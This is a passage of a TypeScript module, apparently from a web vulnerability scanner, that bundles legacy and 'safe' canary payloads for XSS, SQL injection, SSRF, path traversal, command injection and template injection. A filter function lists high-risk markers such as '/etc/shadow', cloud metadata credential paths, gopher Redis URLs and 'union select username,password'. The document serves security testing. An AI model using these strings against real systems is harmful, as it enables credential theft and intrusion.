    tagsAll?: string[];
    contextsAny?: VcContext[];
    maxPerCategory?: number;
}

export interface VcPayloadBundle {
    probeToken: string;
    generatedAt: string;
    totals: {
        all: number;
        byCategory: Record<string, number>;
        byRiskMode: Record<VcRiskMode, number>;
    };
    items: VcPayloadItem[];
}

export interface VcRunnerExport {
    probeToken: string;
    payloads: string[];
    metadata: Array<Pick<VcPayloadItem, 'id' | 'category' | 'riskMode' | 'severity' | 'tags' | 'contexts'>>;
}

// ------------------------------------------------------------
// Internal utils
// ------------------------------------------------------------

function vcNowIso(): string {
    return new Date().toISOString();
}

function vcId(prefix: string = 'vcp'): string {
    return `${prefix}_${Math.random().toString(36).slice(2, 10)}`;
}

function vcDedupeByValue(items: VcPayloadItem[]): VcPayloadItem[] {
    const seen = new Set<string>();
    const out: VcPayloadItem[] = [];
    for (const item of items) {
        const key = `${item.category}|${item.value}`;
        if (seen.has(key)) continue;
        seen.add(key);
        out.push(item);
    }
    return out;
}

function vcShuffleDeterministic<T>(arr: T[], seed: number = 1337): T[] {
    let s = seed >>> 0;
    const rnd = () => ((s = (1664525 * s + 1013904223) >>> 0) / 4294967296);

    const out = [...arr];
    for (let i = out.length - 1; i > 0; i--) {
        const j = Math.floor(rnd() * (i + 1));
        [out[i], out[j]] = [out[j], out[i]];
    }
    return out;
}

function vcCountBy<T extends string>(values: T[]): Record<string, number> {
    const m: Record<string, number> = {};
    for (const v of values) m[v] = (m[v] || 0) + 1;
    return m;
}

function vcHasAny<T>(hay: T[], needles?: T[]): boolean {
    if (!needles || needles.length === 0) return true;
    return needles.some(n => hay.includes(n));
}

function vcHasAll<T>(hay: T[], needles?: T[]): boolean {
    if (!needles || needles.length === 0) return true;
    return needles.every(n => hay.includes(n));
}

// Conservative filter to keep legacy mode usable without passing through the riskiest patterns by default.
// (append-only overlay, does not alter original exports)
function vcIsHighRiskLegacyValue(v: string): boolean {
    const s = v.toLowerCase();

    // obvious destructive / command execution / sensitive file reads / direct JS execution
    const highRiskMarkers = [
        'drop table',
        'insert into users',
        'sleep(',
        'waitfor delay',
        'benchmark(',
        'pg_sleep',
        'extractvalue(',
        'union select username,password',
        'javascript:alert',
        '<script>alert',
        'onerror=alert',
        'onload=alert',
        'exec("id")',
        'registerundefinedfiltercallback("exec")',
        'cat /etc/passwd',
        'type c:\\windows\\win.ini',
        'file:///etc/passwd',
        'dict://127.0.0.1:6379',
        'gopher://127.0.0.1:6379',
        '/latest/meta-data/',
        '/iam/security-credentials/',
        'expect://id',
        '/etc/shadow',
        '/proc/self/environ',
        'eval(atob(',
    ];

    return highRiskMarkers.some(m => s.includes(m));
}

function vcLegacyWrap(
    category: VcCategory,
    values: string[],
    opts: {
        contexts?: VcContext[];
        severity?: VcSeverity;
        tags?: string[];
        description?: string;
        requiresProbeToken?: boolean;
    } = {}
): VcPayloadItem[] {
    return values.map((value) => ({
        id: vcId(),
        category,
        value,
        source: 'legacy',
        riskMode: 'legacy',
        severity: opts.severity ?? 'medium',
        contexts: opts.contexts ?? ['unknown'],
        tags: opts.tags ?? ['legacy'],
        description: opts.description,
        requiresProbeToken: opts.requiresProbeToken ?? false,
        enabled: true,
    }));
}

// ------------------------------------------------------------
// Safe overlay probes (append-only; non-exploit markers)
// ------------------------------------------------------------

export function getVcSafeOverlayPayloads(probeToken: string): VcPayloadItem[] {
    const b64 = typeof Buffer !== 'undefined'
        ? Buffer.from(probeToken, 'utf8').toString('base64')
        : probeToken;

    const mk = (
        category: VcCategory,
        value: string,
        contexts: VcContext[],
        tags: string[],
        description?: string,
        severity: VcSeverity = 'low'
    ): VcPayloadItem => ({
        id: vcId(),
        category,
        value,
        source: 'overlay',
        riskMode: 'safe',
        severity,
        contexts,
        tags,
        description,
        requiresProbeToken: value.includes(probeToken),
        enabled: true,
    });

    return [
        // Reflection / encoding probes
        mk('xss', probeToken, ['html', 'attr', 'query', 'form'], ['marker', 'reflection'], 'Plain canary marker'),
        mk('xss', `[[${probeToken}]]`, ['html', 'query', 'form'], ['marker', 'delimited'], 'Bracket-delimited marker'),
        mk('xss', `"${probeToken}"`, ['attr', 'js'], ['quote', 'double'], 'Quoted marker'),
        mk('xss', `'${probeToken}'`, ['attr', 'js'], ['quote', 'single'], 'Quoted marker'),
        mk('xss', `&#x56;&#x43;${probeToken}`, ['html'], ['encoding', 'html-entity'], 'HTML entity encoded marker'),
        mk('xss', encodeURIComponent(probeToken), ['url', 'query'], ['encoding', 'url'], 'URL-encoded marker'),

        // JSON/XML/parser-safe probes
        mk('sqli', `'${probeToken}`, ['form', 'query', 'json'], ['parser', 'unclosed-quote'], 'Unclosed quote parser probe', 'info'),
        mk('sqli', `"${probeToken}`, ['form', 'query', 'json'], ['parser', 'unclosed-quote'], 'Unclosed quote parser probe', 'info'),
        mk('sqli', JSON.stringify({ probe: probeToken }), ['json'], ['json', 'marker'], 'JSON reflection marker', 'info'),
        mk('ssti', `{{${probeToken}}}`, ['html', 'json', 'xml'], ['template-marker', 'canary'], 'Template marker canary', 'info'),
        mk('ssti', `${'${'}${probeToken}}`, ['html', 'json'], ['template-marker', 'canary'], 'Dollar-brace template canary', 'info'),

        // URL / redirect shape probes (non-malicious)
        mk('open-redirect', `/app?next=${encodeURIComponent(`/cb/${probeToken}`)}`, ['url', 'query'], ['routing', 'local-path'], 'Local redirect path probe', 'info'),
        mk('ssrf', `https://example.invalid/ping?probe=${encodeURIComponent(probeToken)}`, ['url', 'query'], ['url-shape', 'callback'], 'External URL parser/validation probe (invalid TLD)', 'low'),

        // Path normalization probes (non-sensitive targets)
        mk('path-traversal', `../${probeToken}.txt`, ['path', 'query', 'form'], ['normalization', 'dotdot'], 'Relative path normalization probe', 'info'),
        mk('path-traversal', `%2E%2E/${probeToken}.txt`, ['path', 'query'], ['normalization', 'encoded-dotdot'], 'Encoded relative path normalization probe', 'info'),

        // Command sink shape probes (no commands)
        mk('cmd-injection', `--name=${probeToken}`, ['form', 'query'], ['argv-shape'], 'CLI flag shape probe (non-executing)', 'info'),
        mk('cmd-injection', `file_${probeToken}.txt`, ['form', 'query', 'multipart'], ['filename-shape'], 'Filename argument shape probe', 'info'),

        // CORS / header safe markers
        mk('cors', 'null', ['header'], ['origin', 'cors'], 'Origin:null handling probe', 'info'),
        mk('cors', `https://example.invalid`, ['header'], ['origin', 'cors'], 'Invalid TLD origin parser probe', 'info'),
        mk('headers', `VC/${probeToken}`, ['header'], ['header-echo', 'trace'], 'Header echo / forwarding marker', 'info'),

        // Unicode / normalization
        mk('custom', `${probeToken}\u200B`, ['form', 'query', 'json'], ['unicode', 'zero-width'], 'Zero-width space normalization probe', 'low'),
        mk('custom', `${probeToken}\u00A0`, ['form', 'query'], ['unicode', 'nbsp'], 'NBSP normalization probe', 'low'),
        mk('custom', `e\u0301_${probeToken}`, ['form', 'query', 'json'], ['unicode', 'combining'], 'Combining mark normalization probe', 'low'),
        mk('custom', `=?UTF-8?B?${b64}?=`, ['header'], ['encoding', 'mime'], 'MIME encoded-word parser probe', 'low'),
    ];
}

// ------------------------------------------------------------
// Legacy adapters (wrap existing exports without modifying them)
// ------------------------------------------------------------

export function getVcLegacyPayloads(probeToken?: string): VcPayloadItem[] {
    const pt = probeToken ?? generateProbeToken();

    const out: VcPayloadItem[] = [];

    // Wrap old string arrays as metadata-rich items
    out.push(...vcLegacyWrap('xss', getXssPayloads(pt), {
        contexts: ['html', 'attr', 'js', 'url', 'query'],
        severity: 'high',
        tags: ['legacy', 'xss'],
        description: 'Legacy XSS payload list',
        requiresProbeToken: true,
    }));

    out.push(...vcLegacyWrap('sqli', getSqliPayloads(), {
        contexts: ['query', 'form', 'json'],
        severity: 'high',
        tags: ['legacy', 'sqli'],
        description: 'Legacy SQLi/NoSQLi payload list',
        requiresProbeToken: false,
    }));

    out.push(...vcLegacyWrap('ssrf', getSsrfPayloads(), {
        contexts: ['url', 'query', 'json'],
        severity: 'high',
        tags: ['legacy', 'ssrf'],
        description: 'Legacy SSRF payload list',
    }));

    out.push(...vcLegacyWrap('path-traversal', getPathTraversalPayloads(), {
        contexts: ['path', 'query', 'form', 'multipart'],
        severity: 'high',
        tags: ['legacy', 'path-traversal'],
        description: 'Legacy path traversal payload list',
    }));

    out.push(...vcLegacyWrap('open-redirect', getOpenRedirectPayloads(), {
        contexts: ['url', 'query'],
        severity: 'medium',
        tags: ['legacy', 'open-redirect'],
        description: 'Legacy open redirect payload list',
    }));

    out.push(...vcLegacyWrap('cmd-injection', getCmdInjectionPayloads(pt), {
        contexts: ['form', 'query', 'json'],
        severity: 'high',
        tags: ['legacy', 'cmd-injection'],
        description: 'Legacy command injection payload list',
        requiresProbeToken: true,
    }));

    out.push(...vcLegacyWrap('ssti', getSstiPayloads(pt), {
        contexts: ['html', 'json', 'xml'],
        severity: 'high',
        tags: ['legacy', 'ssti'],
        description: 'Legacy SSTI payload list',
        requiresProbeToken: true,
    }));

    // Non-string structured constants as metadata-only pseudo payloads (for reporting/catalog)
    out.push(
        ...CORS_TEST_ORIGINS.map((v) => ({
            id: vcId(),
            category: 'cors' as VcCategory,
            value: v,
            source: 'legacy' as const,
            riskMode: 'legacy' as const,
            severity: 'medium' as VcSeverity,
            contexts: ['header'] as VcContext[],
            tags: ['legacy', 'cors', 'origin'],
            description: 'Legacy CORS test origin',
            enabled: true,
        }))
    );

    return out;
}

// ------------------------------------------------------------
// Filters / query API
// ------------------------------------------------------------

export function vcFilterPayloads(items: VcPayloadItem[], opts: Partial<VcBuildOptions> = {}): VcPayloadItem[] {
    let out = [...items];

    if (opts.categories && opts.categories.length > 0) {
        const allowed = new Set(opts.categories);
        out = out.filter(i => allowed.has(i.category));
    }

    if (opts.contextsAny && opts.contextsAny.length > 0) {
        out = out.filter(i => vcHasAny(i.contexts, opts.contextsAny));
    }

    if (opts.tagsAny && opts.tagsAny.length > 0) {
        out = out.filter(i => vcHasAny(i.tags, opts.tagsAny));
    }

    if (opts.tagsAll && opts.tagsAll.length > 0) {
        out = out.filter(i => vcHasAll(i.tags, opts.tagsAll));
    }

    if (opts.allowHighRiskLegacy === false) {
        out = out.filter(i => !(i.source === 'legacy' && vcIsHighRiskLegacyValue(i.value)));
    }

    if (typeof opts.maxPerCategory === 'number' && opts.maxPerCategory > 0) {
        const limits = new Map<VcCategory, number>();
        const limited: VcPayloadItem[] = [];
        for (const item of out) {
            const current = limits.get(item.category) ?? 0;
            if (current >= opts.maxPerCategory) continue;
            limits.set(item.category, current + 1);
            limited.push(item);
        }
        out = limited;
    }

    return out;
}

// ------------------------------------------------------------
// Bundle builder (main entrypoint)
// ------------------------------------------------------------

export function buildVcPayloadBundle(options: VcBuildOptions = {}): VcPayloadBundle {
    const probeToken = options.probeToken ?? generateProbeToken();

    const includeLegacy = options.includeLegacy ?? true;
    const includeSafeOverlay = options.includeSafeOverlay ?? true;
    const dedupe = options.dedupe ?? true;
    const shuffle = options.shuffle ?? false;
    const seed = options.seed ?? 1337;

    let items: VcPayloadItem[] = [];

    if (includeSafeOverlay) {
        items.push(...getVcSafeOverlayPayloads(probeToken));
    }

    if (includeLegacy) {
        items.push(...getVcLegacyPayloads(probeToken));
    }

    items = vcFilterPayloads(items, options);

    if (dedupe) items = vcDedupeByValue(items);
    if (shuffle) items = vcShuffleDeterministic(items, seed);

    const totalsByCategory = vcCountBy(items.map(i => i.category));
    const totalsByRisk = vcCountBy(items.map(i => i.riskMode)) as Record<VcRiskMode, number>;

    return {
        probeToken,
        generatedAt: vcNowIso(),
        totals: {
            all: items.length,
            byCategory: totalsByCategory,
            byRiskMode: {
                safe: totalsByRisk.safe || 0,
                legacy: totalsByRisk.legacy || 0,
            },
        },
        items,
    };
}

// ------------------------------------------------------------
// Export helpers (runner/report integration)
// ------------------------------------------------------------

export function vcToRunnerExport(bundle: VcPayloadBundle): VcRunnerExport {
    return {
        probeToken: bundle.probeToken,
        payloads: bundle.items.filter(i => i.enabled).map(i => i.value),
        metadata: bundle.items.filter(i => i.enabled).map(i => ({
            id: i.id,
            category: i.category,
            riskMode: i.riskMode,
            severity: i.severity,
            tags: i.tags,
            contexts: i.contexts,
        })),
    };
}

export function vcToJson(bundle: VcPayloadBundle, pretty = true): string {
    return JSON.stringify(bundle, null, pretty ? 2 : 0);
}

export function vcValuesOnly(items: VcPayloadItem[]): string[] {
    return items.filter(i => i.enabled).map(i => i.value);
}

export function vcGroupByCategory(items: VcPayloadItem[]): Record<VcCategory, VcPayloadItem[]> {
    const out = {} as Record<VcCategory, VcPayloadItem[]>;
    for (const item of items) {
        if (!out[item.category]) out[item.category] = [];
        out[item.category].push(item);
    }
    return out;
}

export function vcFindByTag(items: VcPayloadItem[], tag: string): VcPayloadItem[] {
    return items.filter(i => i.tags.includes(tag));
}

export function vcFindByContext(items: VcPayloadItem[], context: VcContext): VcPayloadItem[] {
    return items.filter(i => i.contexts.includes(context));
}

// ------------------------------------------------------------
// Config presets
// ------------------------------------------------------------

export const VC_PRESETS = {
    safeOnly: {
        includeLegacy: false,
        includeSafeOverlay: true,
        allowHighRiskLegacy: false,
        dedupe: true,
        shuffle: false,
    } satisfies VcBuildOptions,

    mixedConservative: {
        includeLegacy: true,
        includeSafeOverlay: true,
        allowHighRiskLegacy: false, // filter obvious destructive/exec patterns
        dedupe: true,
        shuffle: true,
        seed: 1337,
    } satisfies VcBuildOptions,

    legacyFullCatalog: {
        includeLegacy: true,
        includeSafeOverlay: false,
        allowHighRiskLegacy: true,
        dedupe: true,
        shuffle: false,
    } satisfies VcBuildOptions,
};

// ------------------------------------------------------------
// Non-breaking convenience wrappers
// (Do not replace old functions; these are new names)
// ------------------------------------------------------------

export function getAllPayloadsProduction(options: VcBuildOptions = {}): VcPayloadBundle {
    return buildVcPayloadBundle(options);
}

export function getAllPayloadValuesProduction(options: VcBuildOptions = {}): string[] {
    return vcToRunnerExport(buildVcPayloadBundle(options)).payloads;
}

// ------------------------------------------------------------
// Example usage (copy-paste ready)
// ------------------------------------------------------------
/*
const bundle = getAllPayloadsProduction({
    ...VC_PRESETS.mixedConservative,
    categories: ['xss', 'sqli', 'ssrf', 'path-traversal', 'open-redirect', 'cmd-injection', 'ssti'],
    contextsAny: ['query', 'json', 'form'],
    maxPerCategory: 25,
});

console.log('Probe token:', bundle.probeToken);
console.log('Totals:', bundle.totals);

const runner = vcToRunnerExport(bundle);
console.log('Payload count:', runner.payloads.length);

// JSON export for CI artifacts
console.log(vcToJson(bundle, true));
*/